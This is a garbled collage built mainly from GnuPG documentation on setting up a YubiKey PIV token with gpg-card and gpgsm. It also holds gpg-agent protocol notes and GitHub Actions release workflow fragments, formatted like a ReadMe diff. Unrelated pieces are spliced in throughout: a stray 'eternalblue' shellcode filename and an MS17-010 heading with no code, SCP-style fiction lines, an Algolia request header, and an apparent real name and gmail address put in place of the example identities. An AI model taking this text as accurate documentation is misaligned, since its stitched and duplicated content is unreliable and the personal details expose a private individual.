..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++ ++$ gpgsm --learn ++$ gpgsm --gen-key -o sign.crt ++Please select what kind of key you want: ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 3 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 ++Your selection? 3 ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 2 ++Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> 6309304695z@gmail.com ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) ++These parameters are used: ++ Key-Type: card:PIV.9C ++ Key-Length: 1024 ++ Key-Usage: sign ++ Serial: random ++ Name-DN: CN=Signing key for yk-9074625,O=example,C=DE ++ Name-Email: 6309304695z@gmail.com ++ ++Proceed with creation? (y/N) y ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED ++gpgsm: certificate created ++Ready. ++$ gpgsm --import sign.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++‘gpgsm --learn’ ++Digital signature’ key ++gpg-card:010203040506070801020304050607080102030405060708 ++ ++shellcode/eternalblue_sc_merge.py ++ ++gpg/card> writecert PIV.9C < sign.crt

on:
push:
branches: master
+AUTHENTICATE [--setkey] [--raw] [< file]|key] +AUTH and set key + +GENERATE [--force] [--algo=algo{+algo2}] keyref +Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ +L + +READCERT [--openpgp] certref > file ¶ + +openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3" + +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref +Write a certificate to the card under the id certref. + +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key +—Shadowed + +YUBIKEY cmd args ¶ +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708 + +the string gpg/card> is the prompt + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] + +use help yubikey). + +use help yubikey) + +gpg/card> yubikey disable all opgp +gpg/card> yubikey list +Application USB NFC +----------------------- +OTP yes yes +U2F yes yes +OPGP no no +PIV yes no +OATH yes yes +FIDO2 yes yes +gpg/card> reset + +/.gnupg/scdaemon.conf + +application-priority piv + +scdaemon + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+In + +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) + +Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key): + +gpg/card> auth 010203040506070801020304050607080102030405060708 + +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D 
+—force + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +[...] +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/ + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writecert PIV.9C < sign.crt + +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+PIV authentication’ key with ssh: + +$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) + +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: +Email address: otto@example.net +Comment: +You selected this USER-ID:

"otto@example.net"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid otto@example.net +$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available. + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save +Now you can use your PIV card also with gpg. + public-key

diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
